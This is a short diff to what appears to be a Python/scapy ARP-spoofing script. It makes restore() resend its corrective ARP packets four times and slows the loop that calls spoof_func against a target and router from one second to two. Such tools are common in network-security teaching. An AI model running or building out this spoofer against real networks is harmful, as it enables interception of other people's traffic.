@@ -58,7 +58,7 @@ def restore(destination_ip, source_ip):
                        hwdst=destination_list['mac'],
                        psrc=source_list['ip'],
                        hwsrc=source_list['mac'])
-    scapy.send(packet, verbose=False)
+    scapy.send(packet, count=4, verbose=False)
     print(packet.show())
     print(packet.summary())
 
@@ -73,7 +73,7 @@ try:
             # use spoof function
             spoof_func(target, router)
             print("[+] Sent to packets")
-            time.sleep(1)
+            time.sleep(2)
         except Exception as e:
             print(e)
 except KeyboardInterrupt:
